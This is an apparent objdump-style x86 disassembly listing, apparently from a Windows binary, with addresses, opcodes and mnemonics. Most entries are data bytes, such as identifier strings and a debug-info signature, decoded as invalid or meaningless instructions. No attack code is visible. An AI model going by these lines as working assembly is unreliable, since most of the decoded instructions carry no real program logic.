  4332b9:	mov    esi,DWORD PTR [edx-0x4]
  4332bc:	add    bh,cl
  4332be:	dec    ebp
  4332bf:	mov    dh,0x8b
  4332c1:	add    esi,DWORD PTR [ebx]
  4332c3:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4332c9:	add    BYTE PTR [eax],al
  4332cb:	mov    eax,ecx
  4332cd:	loopne 0x43331c
  4332cf:	add    BYTE PTR [ebx-0x757bcc39],cl
  4332d5:	dec    ebx
  4332d6:	or     eax,0x8b7232
  4332db:	in     al,0xc1
  4332dd:	or     DWORD PTR [ebp-0x31],ecx
  4332e0:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  4332e7:	xor    dh,BYTE PTR [edx-0x75]
  4332ea:	add    al,dh
  4332ec:	enter  0x4f09,0xcf
  4332f0:	inc    ebp
  4332f1:	mov    WORD PTR [ebx-0x75cdccb5],cs
  4332f7:	or     al,BYTE PTR ds:0xe4728b
  4332fd:	or     DWORD PTR [ebp-0x31],ecx
  433300:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  433307:	cmp    dh,BYTE PTR [edx+0xf]
  43330a:	add    bl,dl
  43330c:	rol    DWORD PTR [eax],0x4d
  43330f:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433315:	(bad)  
  433316:	or     eax,0x4b7284
  43331b:	xor    al,cl
  43331d:	mov    ecx,DWORD PTR [ebp-0x20]
  433320:	mov    ecx,DWORD PTR [ecx]
  433322:	xor    ecx,edi
  433324:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  43332b:	xor    cl,al
  43332d:	mov    ecx,DWORD PTR [edi]
  43332f:	fadd   QWORD PTR [ebp+0x9]
  433332:	call   0xffd02e06
  433337:	dec    ebx
  433338:	dec    ebp
  433339:	xor    bh,BYTE PTR [ebx]
  43333b:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  43333f:	loopne 0x43333d
  433341:	or     edi,eax
  433343:	iret   
  433344:	ret    
  433345:	mov    WORD PTR [ebp+0x4f],es
  433348:	mov    esi,DWORD PTR [edx]
  43334a:	call   0x8452fa89
  43334f:	(bad)  
  433350:	fwait
  433351:	add    BYTE PTR [edx],dh
  433353:	mov    esi,DWORD PTR [ebx]
  433355:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43335b:	test   BYTE PTR [ebx],dh
  43335d:	dec    ebx
  43335e:	add    esi,DWORD PTR [edx]
  433360:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  433366:	dec    edi
  433368:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  43336f:	xor    al,BYTE PTR [ebx]
  433371:	mov    edi,DWORD PTR [ebx]
  433373:	in     al,0x75
  433375:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43337b:	dec    ebx
  43337c:	xor    esi,DWORD PTR [edx]
  43337e:	lea    ecx,[edx]
  433380:	or     BYTE PTR [ebx+0x900f072],cl
  433386:	ja     0x433357
  433388:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  43338f:	cmp    ch,al
  433391:	jne    0x433386
  433393:	mov    edi,edi
  433395:	fadd   QWORD PTR [ebp+0x0]
  433398:	mov    eax,edi
  43339a:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  4333a1:	mov    edx,DWORD PTR [ebx]
  4333a3:	in     al,0x45
  4333a5:	or     DWORD PTR [ebx],esi
  4333a7:	iret   
  4333a8:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  4333af:	xor    dl,BYTE PTR [eax-0x75]
  4333b2:	sbb    al,0xe0
  4333b4:	dec    DWORD PTR [ecx]
  4333b6:	mov    ecx,edi
  4333b8:	in     al,dx
  4333b9:	mov    eax,es
  4333bb:	dec    ebx
  4333bc:	mov    DWORD PTR [edx],esi
  4333be:	fmul   QWORD PTR [edx]
  4333c0:	jne    0x43334d
  4333c2:	(bad)  
  4333c3:	(bad)  
  4333c5:	or     DWORD PTR [ebp-0x31],eax
  4333c8:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  4333cf:	cmp    bh,bh
  4333d1:	jne    0x433418
  4333d3:	lea    ecx,[ebx-0x38372750]
  4333d9:	inc    ebx
  4333db:	mov    eax,ecx
  4333dd:	mov    eax,0xa00c111
  4333e2:	jne    0x433429
  4333e4:	mov    esi,DWORD PTR [ebx]
  4333e6:	test   al,0x3
  4333e8:	inc    ebp
  4333e9:	mov    DWORD PTR [eax-0xc],edx
  4333ec:	loop   0x433433
  4333ee:	push   DWORD PTR [ebx]
  4333f0:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  4333f6:	add    DWORD PTR [eax],eax
  4333f8:	mov    eax,edi
  4333fa:	lods   al,BYTE PTR ds:[esi]
  4333fb:	dec    ebp
  4333fc:	inc    ebp
  4333fd:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433403:	retf   
  433404:	mov    edx,ecx
  433406:	adc    al,0x84
  433408:	(bad)  
  433409:	std    
  43340a:	ret    
  43340b:	jmp    FWORD PTR [edi-0x2b7474bb]
  433411:	hlt    
  433412:	rol    edi,0x82
  433415:	ret    
  433416:	cld    
  433417:	enter  0x11ff,0x45
  43341b:	inc    ebp
  43341c:	pop    edi
  43341d:	mov    ebx,DWORD PTR [ebx+0x14]
  433420:	ret    0xc7
  433423:	test   BYTE PTR [ebx+0x4532519b],cl
  433429:	jmp    0x4333b6
  43342b:	push   0x8
  43342d:	call   DWORD PTR [esi]
  43342f:	in     al,dx
  433430:	add    BYTE PTR [ebp+0x1],0x50
  433434:	add    bh,ah
  433436:	add    bh,bh
  433438:	icebp  
  433439:	mov    ecx,DWORD PTR [eax]
  43343b:	cld    
  43343c:	pop    es
  43343d:	dec    ebp
  43343e:	shl    DWORD PTR [ebx],0x72
  433441:	add    eax,DWORD PTR [eax]
  433443:	cmp    edx,ecx
  433445:	je     0x433457
  433447:	mov    esi,DWORD PTR [ebp-0x4]
  43344a:	inc    edi
  43344c:	or     al,0xc3
  43344e:	jmp    FWORD PTR [edx-0x18]
  433451:	(bad)  
  433452:	sti    
  433453:	cwde   
  433454:	(bad)  
  433455:	call   0xffa12d60
  43345a:	or     al,0x45
  43345c:	push   ebp
  43345d:	sub    esp,0x18
  433460:	push   ebx
  433461:	inc    ebp
  433462:	mov    edi,edi
  433464:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43346b:	test   al,0x54
  43346d:	inc    ebp
  43346e:	push   ecx
  43346f:	push   eax
  433470:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  433476:	add    ah,bh
  433478:	(bad)  
  433479:	dec    ebp
  43347a:	add    DWORD PTR [ebx],esi
  43347c:	inc    ebp
  43347d:	add    ecx,DWORD PTR [ebx+0x74943b]
  433483:	push   0xffffff8b
  433485:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43348b:	add    eax,DWORD PTR [ecx]
  43348d:	or     BYTE PTR [eax],al
  43348f:	call   0xff852c94
  433494:	mov    eax,DWORD PTR [ebp+0x14]
  433497:	mov    ecx,DWORD PTR [ecx+0x801ac]
  43349d:	inc    ebp
  43349e:	dec    ecx
  43349f:	add    ebp,DWORD PTR [edx+0x14]
  4334a2:	push   0x8b3045
  4334a7:	call   0x33ad821c
  4334ac:	inc    DWORD PTR [ebx]
  4334ae:	mov    DWORD PTR [edi],ecx
  4334b0:	mov    eax,ecx
  4334b2:	or     BYTE PTR [ebp-0x3d],cl
  4334b5:	cmp    eax,edi
  4334b7:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4334bc:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4334c2:	adc    al,0xc9
  4334c4:	inc    ebp
  4334c5:	adc    BYTE PTR [eax+0x55],dl
  4334c8:	jne    0x4334b6
  4334ca:	call   0xff54345a
  4334cf:	dec    ebp
  4334d0:	inc    ebp
  4334d1:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4334d7:	add    BYTE PTR [ebx],bh
  4334d9:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4334dd:	push   esp
  4334de:	or     al,0x51
  4334e0:	dec    ebp
  4334e1:	xor    DWORD PTR [ebx],0xf32039b
  4334e7:	cmp    eax,DWORD PTR [ebp+0x74]
  4334ea:	mov    edi,edi
  4334ec:	pop    edi
  4334ed:	adc    BYTE PTR [ebx+0x75],bl
  4334f0:	ret    0x50
  4334f3:	mov    edx,DWORD PTR ss:[edi-0x7d]
  4334f7:	(bad)  
  4334f8:	clc    
  4334f9:	mov    esp,ebp
  4334fb:	pop    ecx
  4334fc:	mov    ecx,0xf80085c2
  433501:	mov    ecx,DWORD PTR [ecx+edx*2]
  433504:	push   esi
  433505:	push   esi
  433506:	(bad)  
  433507:	lock add DWORD PTR [ebp+0x44],eax
  43350b:	mov    edx,DWORD PTR [eax]
  43350d:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433511:	or     BYTE PTR [edi+eax*1+0x51],dl
  433515:	ret    
  433516:	xor    ebx,DWORD PTR [ebx+0x37232be]
  43351c:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433522:	or     al,0x80
  433524:	jge    0x433527
  433526:	mov    DWORD PTR [eax],eax
  433528:	and    al,0x8
  43352a:	cmp    DWORD PTR [ebp+0x10],eax
  43352d:	mov    edx,DWORD PTR [esi]
  43352f:	xchg   esp,eax
  433530:	dec    esp
  433531:	add    BYTE PTR [eax],dl
  433533:	mov    ecx,edx
  433535:	add    edx,DWORD PTR [esp+edi*1+0x8]
  433539:	dec    ebp
  43353a:	into   
  43353b:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433541:	mov    edx,DWORD PTR [eax+0x14]
  433544:	das    
  433545:	add    al,0x45
  433547:	add    BYTE PTR [ebp+0x0],dh
  43354a:	mov    edi,edi
  43354c:	and    al,0x50
  43354e:	mov    eax,DWORD PTR [eax]
  433550:	and    al,0xd1
  433552:	xor    eax,DWORD PTR [esi]
  433554:	lea    eax,[ebp+0x8]
  433557:	xor    esi,DWORD PTR [edx+0x3]
  43355a:	add    BYTE PTR [ecx+0x4510fc44],cl
  433560:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  433566:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  433570:	cmp    al,0xff
  433572:	pushf  
  433573:	mov    edi,edi
  433575:	or     BYTE PTR [esi+ecx*1],cl
  433578:	jne    0x43353d
  43357a:	call   0xc3546
  43357f:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433583:	mov    ebx,DWORD PTR [eax]
  433585:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  433589:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  433591:	pop    esi
  433592:	and    al,0xc9
  433594:	and    al,0x10
  433596:	call   DWORD PTR [ebp-0x73]
  433599:	in     al,dx
  43359a:	jmp    esp
  43359c:	je     0x433521
  43359e:	call   DWORD PTR [eax]
  4335a0:	and    al,0x31
  4335a2:	call   0xffcd3443
  4335a7:	and    al,0x44
  4335a9:	push   edi
  4335aa:	or     al,0x41
  4335ac:	pop    esi
  4335ad:	mov    ebp,esp
  4335af:	and    al,0xc2
  4335b1:	mov    eax,DWORD PTR [eax]
  4335b3:	and    al,0x85
  4335b5:	mov    edx,0x733080e
  4335ba:	jne    0x4335b6
  4335bc:	test   DWORD PTR [ebx+0x3083275],ebx
  4335c2:	dec    DWORD PTR [ecx-0x74dbdb15]
  4335c8:	sbb    BYTE PTR [esp+edx*1],cl
  4335cb:	jl     0x4335cc
  4335cd:	adc    al,0x24
  4335cf:	dec    ebp
  4335d0:	mov    esi,DWORD PTR [ebp+0xc]
  4335d3:	mov    ecx,DWORD PTR [eax]
  4335d5:	and    al,0x39
  4335d7:	xor    ebx,DWORD PTR [ebx+ecx*4]
  4335da:	or     BYTE PTR [eax+edx*1],ah
  4335dd:	add    eax,DWORD PTR [edi+ecx*1+0x4c24ca32]
  4335e4:	clc    
  4335e5:	jmp    0x433583
  4335e7:	adc    al,bh
  4335e9:	inc    esp
  4335ea:	je     0x433638
  4335ec:	and    al,0xc2
  4335ee:	je     0x43358b
  4335f0:	mov    ecx,DWORD PTR [ecx+0x687d685d]
  4335f6:	dec    DWORD PTR [ecx+0x235fbf08]
  4335fc:	sbb    al,0x10
  4335fe:	add    BYTE PTR [esi+edi*1+0x10],cl
  433602:	add    BYTE PTR [ebx+0xb],dh
  433605:	adc    BYTE PTR [eax],al
  433607:	mov    WORD PTR ds:0x3d450010,?
  43360d:	adc    BYTE PTR [eax],al
  43360f:	add    DWORD PTR [eax+edx*1],esp
  433612:	add    BYTE PTR [edx+0x6],cl
  433615:	adc    BYTE PTR [eax],al
  433617:	sub    dx,WORD PTR [eax]
  43361a:	add    bh,dl
  43361c:	imul   edx,DWORD PTR [eax],0x10302300
  433622:	add    BYTE PTR [esi-0x4ffef89],dl
  433628:	xor    eax,0x35ff0043
  43362d:	inc    ebx
  43362e:	add    BYTE PTR [ebx],al
  433630:	ss inc ebx
  433632:	add    BYTE PTR [edi],al
  433634:	ss inc ebx
  433636:	add    BYTE PTR [ebx],cl
  433638:	ss inc ebx
  43363a:	add    BYTE PTR [edi],cl
  43363c:	ss inc ebx
  43363e:	add    BYTE PTR [ebx],dl
  433640:	ss inc ebx
  433642:	add    BYTE PTR [edi],dl
  433644:	ss inc ebx
  433646:	add    BYTE PTR [ebx],bl
  433648:	ss inc ebx
  43364a:	add    BYTE PTR [edi],bl
  43364c:	ss inc ebx
  43364e:	add    BYTE PTR [ebx],ah
  433650:	ss inc ebx
  433652:	add    BYTE PTR [eax+0x9001011],ah
  433658:	jo     0x43366a
  43365a:	add    BYTE PTR ds:0xd7001027,ch
  433660:	pop    eax
  433661:	adc    BYTE PTR [eax],al
  433663:	push   es
  433664:	adc    al,0x10
  433666:	add    BYTE PTR [esi+0x33001031],ah
  43366c:	ins    BYTE PTR es:[edi],dx
  43366d:	adc    BYTE PTR [eax],al
  43366f:	jb     0x4336b0
  433671:	adc    BYTE PTR [eax],al
  433673:	push   ebx
  433674:	ss inc ebx
  433676:	add    BYTE PTR [edi+0x36],dl
  433679:	inc    ebx
  43367a:	add    BYTE PTR [ebx+0x36],bl
  43367d:	inc    ebx
  43367e:	add    BYTE PTR [edi+0x36],bl
  433681:	inc    ebx
  433682:	add    BYTE PTR [ebx+0x36],ah
  433685:	inc    ebx
  433686:	add    BYTE PTR [edi+0x36],ah
  433689:	inc    ebx
  43368a:	add    BYTE PTR [ebx+0x36],ch
  43368d:	inc    ebx
  43368e:	add    BYTE PTR [edi+0x36],ch
  433691:	inc    ebx
  433692:	add    dh,cl
  433694:	jge    0x4336a6
  433696:	add    BYTE PTR [esi-0x3dffef8e],dl
  43369c:	or     dl,BYTE PTR [eax]
  43369e:	add    dh,bl
  4336a0:	sub    dl,BYTE PTR [eax]
  4336a2:	add    BYTE PTR [edx],bl
  4336a4:	ins    BYTE PTR es:[edi],dx
  4336a5:	adc    BYTE PTR [eax],al
  4336a7:	addr16 jno 0x4336ba
  4336aa:	add    BYTE PTR [ebp+0x3d],ch
  4336ad:	adc    BYTE PTR [eax],al
  4336af:	lds    esp,FWORD PTR [eax+0x10]
  4336b2:	add    BYTE PTR [ebx-0x68ffbcca],dl
  4336b8:	ss inc ebx
  4336ba:	add    BYTE PTR [ebx-0x60ffbcca],bl
  4336c0:	ss inc ebx
  4336c2:	add    BYTE PTR [ebx-0x58ffbcca],ah
  4336c8:	ss inc ebx
  4336ca:	add    BYTE PTR [ebx-0x50ffbcca],ch
  4336d0:	ss inc ebx
  4336d2:	add    BYTE PTR [esp+edx*1],bh
  4336d5:	adc    BYTE PTR [eax],al
  4336d7:	clc    
  4336d8:	cmp    dl,BYTE PTR [eax]
  4336da:	add    BYTE PTR [ecx],ah
  4336dc:	pop    ds
  4336dd:	adc    BYTE PTR [eax],al
  4336df:	mov    edi,0x6001073
  4336e4:	adc    al,0x10
  4336e6:	add    BYTE PTR [ecx+0x34],bh
  4336e9:	adc    BYTE PTR [eax],al
  4336eb:	cmp    edi,DWORD PTR [eax+edx*1+0x0]
  4336ef:	shl    DWORD PTR [edx+0x10],1
  4336f2:	add    bl,dl
  4336f4:	ss inc ebx
  4336f6:	add    bh,dl
  4336f8:	ss inc ebx
  4336fa:	add    bl,bl
  4336fc:	ss inc ebx
  4336fe:	add    bh,bl
  433700:	ss inc ebx
  433702:	add    bl,ah
  433704:	ss inc ebx
  433706:	add    bh,ah
  433708:	ss inc ebx
  43370a:	add    bl,ch
  43370c:	ss inc ebx
  43370e:	add    bh,ch
  433710:	ss inc ebx
  433712:	add    BYTE PTR [ebp+0x14],al
  433715:	adc    BYTE PTR [eax],al
  433717:	fwait
  433718:	pop    ds
  433719:	adc    BYTE PTR [eax],al
  43371b:	jnp    0x433740
  43371d:	adc    BYTE PTR [eax],al
  43371f:	pop    esi
  433720:	adc    BYTE PTR cs:[eax],al
  433723:	popf   
  433724:	jno    0x433736
  433726:	add    ah,bl
  433728:	inc    ebp
  433729:	adc    BYTE PTR [eax],al
  43372b:	sbb    edx,DWORD PTR [edx+0x10]
  43372e:	add    BYTE PTR [edx+0x13001029],bl
  433734:	aaa    
  433735:	inc    ebx
  433736:	add    BYTE PTR [edi],dl
  433738:	aaa    
  433739:	inc    ebx
  43373a:	add    BYTE PTR [ebx],bl
  43373c:	aaa    
  43373d:	inc    ebx
  43373e:	add    BYTE PTR [edi],bl
  433740:	aaa    
  433741:	inc    ebx
  433742:	add    BYTE PTR [ebx],ah
  433744:	aaa    
  433745:	inc    ebx
  433746:	add    BYTE PTR [edi],ah
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [ebx],ch
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [edi],ch
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [esp+esi*1+0x4b],dl
  433756:	aaa    
  433757:	pop    edi
  433758:	inc    edx
  433759:	dec    ebx
  43375a:	xor    DWORD PTR [ecx],edi
  43375c:	push   edi
  43375d:	add    BYTE PTR [ecx+0x39],cl
  433760:	xor    al,0x5f
  433762:	pop    ecx
  433763:	inc    edi
  433764:	push   edx
  433765:	pop    edi
  433766:	dec    edx
  433767:	xor    al,BYTE PTR [edx+0x30]
  43376a:	push   ebx
  43376b:	add    BYTE PTR [ecx+0x4a],cl
  43376e:	cmp    BYTE PTR [edi+0x38],bl
  433771:	xor    al,0x43
  433773:	xor    bl,BYTE PTR [eax+0x36]
  433776:	pop    edi
  433777:	inc    ebx
  433778:	add    BYTE PTR [edx+0x33],cl
  43377b:	dec    ebp
  43377c:	cmp    BYTE PTR [edi+0x53],bl
  43377f:	xor    DWORD PTR [eax],edi
  433781:	pop    edx
  433782:	pop    edi
  433783:	xor    BYTE PTR [edx+0x52],cl
  433786:	inc    ecx
  433787:	add    BYTE PTR [edx+0x42],al
  43378a:	inc    ebp
  43378b:	pop    edi
  43378c:	cmp    DWORD PTR [eax],edi
  43378e:	push   ebp
  43378f:	inc    edx
  433790:	xor    eax,0x5244505f
  433795:	xor    BYTE PTR [eax],al
  433797:	inc    edx
  433798:	inc    esp
  433799:	inc    edx
  43379a:	cmp    DWORD PTR [edi+0x52],ebx
  43379d:	dec    esp
  43379e:	inc    ebp
  43379f:	add    BYTE PTR [ebx+0x37],dl
  4337a2:	push   esp
  4337a3:	xor    BYTE PTR [edi+0x55],bl
  4337a6:	push   ebx
  4337a7:	aaa    
  4337a8:	dec    ebp
  4337a9:	pop    edi
  4337aa:	xor    ecx,DWORD PTR [edx+0x4e]
  4337ad:	dec    ebx
  4337ae:	add    BYTE PTR [edx+0x47],cl
  4337b1:	inc    edi
  4337b2:	xor    eax,0x534e5f32
  4337b7:	push   esp
  4337b8:	pop    edi
  4337b9:	push   esp
  4337ba:	inc    edx
  4337bb:	add    BYTE PTR [ebx+0x4d],al
  4337be:	xor    BYTE PTR [edi+0x47],bl
  4337c1:	cmp    DWORD PTR [ecx+0x5f],ebx
  4337c4:	push   eax
  4337c5:	push   ecx
  4337c6:	push   ecx
  4337c7:	pop    edi
  4337c8:	inc    ebx
  4337c9:	push   edi
  4337ca:	push   esi
  4337cb:	add    BYTE PTR [ecx+0x57],cl
  4337ce:	inc    ebp
  4337cf:	pop    edi
  4337d0:	pop    ecx
  4337d1:	push   edx
  4337d2:	inc    edx
  4337d3:	pop    edi
  4337d4:	inc    edi
  4337d5:	add    BYTE PTR [ebx+0x51],dl
  4337d8:	cmp    DWORD PTR ds:0x4d305f33,esi
  4337de:	inc    edi
  4337df:	xor    edx,DWORD PTR [edx+0x34]
  4337e2:	pop    edi
  4337e3:	pop    edx
  4337e4:	cmp    BYTE PTR [eax],al
  4337e6:	inc    edi
  4337e7:	xor    esi,DWORD PTR ds:0x5451585f
  4337ed:	dec    esp
  4337ee:	add    BYTE PTR [edi+esi*1+0x34],cl
  4337f2:	pop    edi
  4337f3:	cmp    BYTE PTR [edi+0x49],dl
  4337f6:	xor    eax,0x5700505f
  4337fb:	cmp    DWORD PTR [edi+ebx*2+0x50],eax
  4337ff:	dec    esi
  433800:	dec    edx
  433801:	cmp    BYTE PTR [eax],al
  433803:	pop    edx
  433804:	dec    ebx
  433805:	xor    eax,0x4f5f3131
  43380a:	xor    dh,BYTE PTR [ecx]
  43380c:	pop    edi
  43380d:	inc    ebp
  43380e:	push   esp
  43380f:	inc    esp
  433810:	inc    ebp
  433811:	add    BYTE PTR [edi+0x55],dl
  433814:	cmp    DWORD PTR [edi+0x5a],ebx
  433817:	push   edx
  433818:	inc    edi
  433819:	xor    DWORD PTR [ebp+0x0],ecx
  43381c:	pop    edx
  43381d:	dec    ecx
  43381e:	dec    ebp
  43381f:	ss pop edi
  433821:	pop    edx
  433822:	push   edx
  433823:	cmp    BYTE PTR [esi+0x30],dl
  433826:	pop    edi
  433827:	push   ecx
  433828:	dec    esi
  433829:	add    BYTE PTR [ebx+0x32],dl
  43382c:	inc    ebx
  43382d:	cmp    BYTE PTR [edi+0x52],bl
  433830:	dec    ecx
  433831:	xor    BYTE PTR [eax],al
  433833:	inc    edi
  433834:	xor    eax,0x314f5f4b
  433839:	xor    DWORD PTR [edi+0x38],ebx
  43383c:	push   ebp
  43383d:	add    BYTE PTR [edi+0x4b],al
  433840:	xor    bl,BYTE PTR [edi+0x43]
  433843:	push   ebp
  433844:	cmp    DWORD PTR [ebp+0x4b],ecx
  433847:	ss pop edi
  433849:	pop    edx
  43384a:	push   edi
  43384b:	inc    esp
  43384c:	xor    BYTE PTR [eax],al
  43384e:	dec    ecx
  43384f:	inc    edi
  433850:	xor    eax,0x3058555f
  433855:	dec    ebx
  433856:	pop    edi
  433857:	push   edi
  433858:	add    BYTE PTR [eax+0x0],bl
  43385b:	inc    edi
  43385c:	add    BYTE PTR [edx+0x0],al
  43385f:	pop    edi
  433860:	add    BYTE PTR [ebx],dh
  433862:	add    BYTE PTR [eax],bh
  433864:	add    BYTE PTR [ebx+0x0],cl
  433867:	xor    eax,0x33003500
  43386c:	add    BYTE PTR [eax],dh
  43386e:	add    BYTE PTR [edi+0x0],bl
  433871:	push   esp
  433872:	add    BYTE PTR [ebp+0x0],cl
  433875:	xor    BYTE PTR [eax],al
  433877:	add    BYTE PTR [eax],al
  433879:	inc    esi
  43387a:	add    BYTE PTR [eax+0x0],bl
  43387d:	xor    BYTE PTR [eax],al
  43387f:	pop    edi
  433880:	add    BYTE PTR [ecx],dh
  433882:	add    BYTE PTR [ebx+0x0],al
  433885:	xor    eax,0x5f003100
  43388a:	add    BYTE PTR [ecx+0x0],al
  43388d:	xor    eax,DWORD PTR [eax]
  43388f:	add    BYTE PTR [eax],al
  433891:	push   ebx
  433892:	add    BYTE PTR [ebx+0x0],dl
  433895:	dec    eax
  433896:	add    BYTE PTR [edi+0x0],bl
  433899:	push   esp
  43389a:	add    BYTE PTR [ebx+0x0],al
  43389d:	push   ebx
  43389e:	add    BYTE PTR [edx+0x0],dl
  4338a1:	pop    edi
  4338a2:	add    BYTE PTR [ecx+0x0],dl
  4338a5:	dec    edi
  4338a6:	add    BYTE PTR [edi+0x0],al
  4338a9:	push   ecx
  4338aa:	add    BYTE PTR [edi+0x0],bl
  4338ad:	pop    ecx
  4338ae:	add    BYTE PTR [eax],al
  4338b0:	add    BYTE PTR [edi+0x0],cl
  4338b3:	dec    edi
  4338b4:	add    BYTE PTR [ebp+0x0],dl
  4338b7:	cmp    DWORD PTR [eax],eax
  4338b9:	pop    edi
  4338ba:	add    BYTE PTR [edx],dh
  4338bc:	add    BYTE PTR [eax+eax*1+0x32],al
  4338c0:	add    BYTE PTR ds:0x47005f00,dh
  4338c6:	add    BYTE PTR ds:0x48000000,dh
  4338cc:	add    BYTE PTR [edx+0x0],cl
  4338cf:	push   eax
  4338d0:	add    BYTE PTR [edi+0x0],bl
  4338d3:	cmp    BYTE PTR [eax],al
  4338d5:	add    BYTE PTR ss:0x55004100,dh
  4338dc:	add    BYTE PTR [edi+0x0],bl
  4338df:	push   edx
  4338e0:	add    BYTE PTR [edi],dh
  4338e2:	add    BYTE PTR [ecx+0x0],cl
  4338e5:	add    BYTE PTR [eax],al
  4338e7:	inc    esp
  4338e8:	add    BYTE PTR [ecx+0x0],dl
  4338eb:	inc    edx
  4338ec:	add    BYTE PTR [edi+0x0],bl
  4338ef:	push   ecx
  4338f0:	add    BYTE PTR [ecx+0x0],bl
  4338f3:	dec    edi
  4338f4:	add    BYTE PTR [eax+0x0],dl
  4338f7:	add    BYTE PTR [eax],al
  4338f9:	dec    edx
  4338fa:	add    BYTE PTR [ecx+0x0],dl
  4338fd:	inc    esp
  4338fe:	add    BYTE PTR [edi+0x0],bl
  433901:	dec    edx
  433902:	add    BYTE PTR [eax],dh
  433904:	add    BYTE PTR [ecx],dh
  433906:	add    BYTE PTR [ebx+0x0],dl
  433909:	push   ecx
  43390a:	add    BYTE PTR [ecx],dh
  43390c:	add    BYTE PTR [edi+0x0],bl
  43390f:	push   edi
  433910:	add    BYTE PTR [eax],al
  433912:	add    BYTE PTR [ebx+0x0],cl
  433915:	pop    edx
  433916:	add    BYTE PTR [esi],dh
  433918:	add    BYTE PTR [edi+0x0],bl
  43391b:	inc    ebx
  43391c:	add    BYTE PTR [eax+eax*1+0x5a],dl
  433920:	add    BYTE PTR [edi+0x0],bl
  433923:	push   edi
  433924:	add    BYTE PTR [ebx],dh
  433926:	add    BYTE PTR [esi+0x0],cl
  433929:	push   ebp
  43392a:	add    BYTE PTR [edi+0x0],bl
  43392d:	dec    edx
  43392e:	add    BYTE PTR [eax],al
  433930:	add    BYTE PTR [edi+0x0],dl
  433933:	aaa    
  433934:	add    BYTE PTR [eax],bh
  433936:	add    BYTE PTR [edi+0x0],bl
  433939:	pop    eax
  43393a:	add    BYTE PTR [edi+0x0],cl
  43393d:	inc    edi
  43393e:	add    BYTE PTR [edi+0x0],bl
  433941:	xor    al,0x0
  433943:	push   eax
  433944:	add    BYTE PTR [ecx+0x0],cl
  433947:	push   ebp
  433948:	add    BYTE PTR [eax],al
  43394a:	add    BYTE PTR [edi+0x0],dl
  43394d:	push   esp
  43394e:	add    BYTE PTR [ebx+0x0],cl
  433951:	add    BYTE PTR [eax],al
  433953:	add    BYTE PTR [edx+0x53],dl
  433956:	inc    esp
  433957:	push   ebx
  433958:	call   0xda15:0x82cfa240
  43395f:	inc    ebx
  433960:	mov    cs,WORD PTR [ebp-0x66]
  433963:	or     BYTE PTR [eax+0x13],bl
  433966:	mov    DWORD PTR [edi+0x1b],ebx
  43396c:	push   esp
  43396d:	cmp    bl,BYTE PTR [ecx+edi*2+0x69]
  433971:	addr16 push edi
  433973:	bound  bx,DWORD PTR [edx+0x45]
  433977:	outs   dx,BYTE PTR ds:[esi]
  433978:	pop    esp
  433979:	je     0x4339ee
  43397b:	ja     0x4339be
  43397d:	imul   edx,DWORD PTR [ecx+esi*2+0x4d],0x63455c61
  433985:	js     0x4339f6
  433987:	jp     0x4339f8
  433989:	jns    0x4339ef
  43398b:	jp     0x4339f5
  43398d:	je     0x4339f3
  43398f:	jp     0x4339f3
  433991:	cs jo  0x4339f8
  433994:	bound  eax,QWORD PTR [eax]
	...
